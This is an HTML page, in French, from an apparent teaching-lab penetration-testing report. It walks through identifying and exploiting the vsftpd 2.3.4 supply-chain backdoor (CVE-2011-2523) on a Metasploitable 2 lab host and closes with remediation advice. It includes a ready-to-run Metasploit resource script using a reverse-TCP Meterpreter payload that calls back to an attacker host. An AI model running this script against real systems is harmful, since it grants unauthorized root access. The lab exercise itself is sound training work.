@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>vsftpd 2.3.4 Backdoor — TP-PENTEST-MS123</title>
+<link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+<div class="page">
+
+  <div class="classification-band">LABO PÉDAGOGIQUE — USAGE INTERNE</div>
+
+  <header class="doc-header">
+    <div class="agency">TP-PENTEST-MS123-2026 &middot; <a href="../index.html" style="color:inherit;">&larr; retour au sommaire</a></div>
+    <h1 class="doc-title">vsftpd 2.3.4 — Backdoor</h1>
+    <h2 class="doc-subtitle">Exécution de commande à distance via porte dérobée insérée dans la chaîne de distribution</h2>
+    <table class="meta">
+      <tr><td class="label">Service / Port</td><td>FTP (vsftpd) — port <code class="mono">21</code></td></tr>
+      <tr><td class="label">Cible</td><td>Metasploitable 2 — <code class="mono">172.28.128.5</code></td></tr>
+      <tr><td class="label">CVE</td><td><a href="https://nvd.nist.gov/vuln/detail/CVE-2011-2523">CVE-2011-2523</a></td></tr>
+      <tr><td class="label">Résultat</td><td><strong>Accès root</strong> (session Meterpreter complète)</td></tr>
+      <tr><td class="label">Testé par</td><td>KAGBAHINTO Jules</td></tr>
+    </table>
+  </header>
+
+  <h2 class="section">1. Identification</h2>
+  <p>Le scan de reconnaissance sur le port 21 de la cible révèle un serveur FTP vsftpd en
+  version 2.3.4 — une version précise connue pour avoir été compromise au niveau de sa
+  distribution officielle.</p>
+
+  <figure class="capture" id="cap-recon">
+    <img src="../images/vsftpd/01-recon-nmap.png" alt="Résultat du scan nmap sur le port 21">
+    <figcaption>
+      <strong class="idx">1.</strong>
+      <span class="desc">Résultat de <code>nmap -sV -p 21 172.28.128.5</code> : le service est
+      identifié comme <code>vsftpd 2.3.4</code>, version connue pour contenir une porte
+      dérobée.</span>
+      <span class="fname">images/vsftpd/01-recon-nmap.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">2. Méthode d'identification de la CVE et du module</h2>
+  <p>À partir de la version exacte obtenue en reconnaissance (<code>vsftpd 2.3.4</code>),
+  première question indépendante de tout outil : cette version a-t-elle une faille connue ?</p>
+
+  <pre class="terminal">$ searchsploit vsftpd 2.3.4
+
+---------------------------------------------- ---------------------------------
+ Exploit Title                                |  Path
+---------------------------------------------- ---------------------------------
+vsftpd 2.3.4 - Backdoor Command Execution      | unix/remote/49757.py
+vsftpd 2.3.4 - Backdoor Command Execution (Me  | unix/remote/17491.rb
+---------------------------------------------- ---------------------------------</pre>
+
+  <p>Confirmé — un exploit existe. <code>searchsploit</code> ne donne ni la CVE ni un chemin
+  de module Metasploit directement utilisable, donc étape suivante : chercher
+  <strong>dans <code>msfconsole</code></strong> puisque c'est l'outil choisi pour
+  l'exploitation :</p>
+
+  <pre class="terminal">$ msfconsole -q -x "search vsftpd; exit"
+
+#  Full Name                             Disclosure Date  Rank       Check  Name
+-  ---------                             ---------------  ----       -----  ----
+0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 and Earlier STAT Denial of Service
+1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution</pre>
+
+  <p><strong>C'est de là que vient le chemin exact
+  <code>exploit/unix/ftp/vsftpd_234_backdoor</code></strong> — deux résultats remontent pour
+  "vsftpd", mais un seul correspond à la version 2.3.4 précise identifiée en reconnaissance
+  (<code>vsftpd_232</code> vise une version antérieure et différente, un simple déni de
+  service). Reste à obtenir la CVE elle-même, absente des deux résultats précédents :</p>
+
+  <pre class="terminal">$ msfconsole -q -x "info exploit/unix/ftp/vsftpd_234_backdoor; exit"
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2011-2523
+  OSVDB (73573)
+  http://pastebin.com/AetT9sS5
+  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html</pre>
+
+  <p>La section <code>References</code> de la sortie confirme <strong>CVE-2011-2523</strong>.
+  En recoupant avec les liens fournis, on comprend la nature exacte de la faille : entre le
+  30 juin et le 3 juillet 2011, l'archive source officielle de vsftpd 2.3.4 a été remplacée
+  par une version trafiquée directement sur le serveur de téléchargement du mainteneur — une
+  compromission de la <strong>chaîne de distribution logicielle</strong> (supply chain), et
+  non une faille de conception dans le code légitime du projet. Le code injecté active un
+  mécanisme simple : si le nom d'utilisateur envoyé lors d'une connexion FTP contient la
+  séquence <code>:)</code>, le serveur ouvre un <strong>shell root</strong> en écoute sur le
+  port TCP <code>6200</code>, sans authentification supplémentaire.</p>
+
+  <blockquote class="evidence">
+    Backdoor déclenchée par un simple login FTP contenant <code>:)</code> &mdash; aucune
+    authentification valide requise. Shell root ouvert en écoute sur <code>6200/tcp</code>.
+  </blockquote>
+
+  <figure class="capture" id="cap-searchsploit">
+    <img src="../images/vsftpd/02-searchsploit.png" alt="Résultat de searchsploit vsftpd 2.3.4">
+    <figcaption>
+      <strong class="idx">2.</strong>
+      <span class="desc">Résultat de <code>searchsploit vsftpd 2.3.4</code> : deux exploits
+      connus identifiés pour cette version exacte.</span>
+      <span class="fname">images/vsftpd/02-searchsploit.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">3. Démarche d'exploitation</h2>
+  <p>Le module Metasploit dédié existant déjà (<code>exploit/unix/ftp/vsftpd_234_backdoor</code>),
+  aucune recherche d'exploit supplémentaire n'était nécessaire. L'exploitation a été scriptée
+  via un resource script pour en garantir la reproductibilité :</p>
+
+  <pre class="terminal">cat > /tmp/vsftpd.rc &lt;&lt; 'EOF'
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 172.28.128.5
+set RPORT 21
+set LHOST 172.28.128.1
+exploit -z
+sessions -l
+sessions -i 1 -c id
+sessions -K
+exit -y
+EOF
+msfconsole -q -r /tmp/vsftpd.rc</pre>
+
+  <p><strong class="field">Point d'attention —</strong> le réglage de <code>LHOST</code> est
+  obligatoire : le payload par défaut de ce module (<code>cmd/linux/http/x86/meterpreter_reverse_tcp</code>)
+  établit une connexion retour vers l'attaquant et a donc besoin de savoir où se connecter.
+  Sans <code>LHOST</code>, l'exploitation échoue avec une erreur de validation d'option.</p>
+
+  <figure class="capture" id="cap-exploit">
+    <img src="../images/vsftpd/03-exploit-msfconsole.png" alt="Lancement de l'exploit dans msfconsole">
+    <figcaption>
+      <strong class="idx">3.</strong>
+      <span class="desc">Lancement du resource script dans <code>msfconsole</code> : le module
+      confirme la vulnérabilité de la bannière FTP, déclenche la backdoor, et ouvre une
+      session Meterpreter.</span>
+      <span class="fname">images/vsftpd/03-exploit-msfconsole.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">4. Preuve d'accès obtenu</h2>
+  <p>La commande <code>sessions -l</code> confirme l'ouverture d'une session Meterpreter avec
+  des privilèges root, et <code>id</code> exécuté dans la session confirme
+  <code>uid=0(root)</code>.</p>
+
+  <figure class="capture" id="cap-preuve">
+    <img src="../images/vsftpd/04-session-root.png" alt="Session Meterpreter root confirmée">
+    <figcaption>
+      <strong class="idx">4.</strong>
+      <span class="desc">Sortie de <code>sessions -l</code> et <code>id</code> confirmant
+      l'accès root complet (<code>uid=0(root) gid=0(root)</code>) sur
+      <code>172.28.128.5</code>.</span>
+      <span class="fname">images/vsftpd/04-session-root.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">5. Remédiation</h2>
+  <div class="verdict-box">
+    <span class="verdict-label">RECOMMANDATIONS</span>
+    <ul style="margin-top:6px;">
+      <li>Mettre à jour vsftpd vers une version ultérieure non affectée par cette
+      compromission historique (toute version postérieure à juillet 2011).</li>
+      <li>Vérifier systématiquement l'intégrité des archives source téléchargées
+      (hash SHA-256 publié par le mainteneur) avant compilation/déploiement, en particulier
+      pour les logiciels critiques exposés sur Internet.</li>
+      <li>Mettre en place une surveillance réseau capable de détecter l'ouverture inhabituelle
+      d'un port en écoute (ici 6200/tcp) consécutive à une connexion sur un service exposé.</li>
+      <li>Appliquer le principe de moindre privilège : un service FTP ne devrait jamais
+      pouvoir, même en cas de compromission, ouvrir un shell avec des droits root.</li>
+    </ul>
+  </div>
+
+  <h2 class="section">6. Sources</h2>
+  <ul>
+    <li>Write-up technique détaillé : <a href="../../ms2/jules/vsftpd.md"><code>ms2/jules/vsftpd.md</code></a> (dépôt du labo)</li>
+    <li>CVE-2011-2523 : <a href="https://nvd.nist.gov/vuln/detail/CVE-2011-2523">nvd.nist.gov/vuln/detail/CVE-2011-2523</a></li>
+  </ul>
+
+  <div class="status-footer">FIN DE SECTION — vsftpd 2.3.4 BACKDOOR</div>
+  <div class="signoff">KAGBAHINTO Jules &amp; ZANNOU Josaphat</div>
+
+</div>
+</body>
+</html>
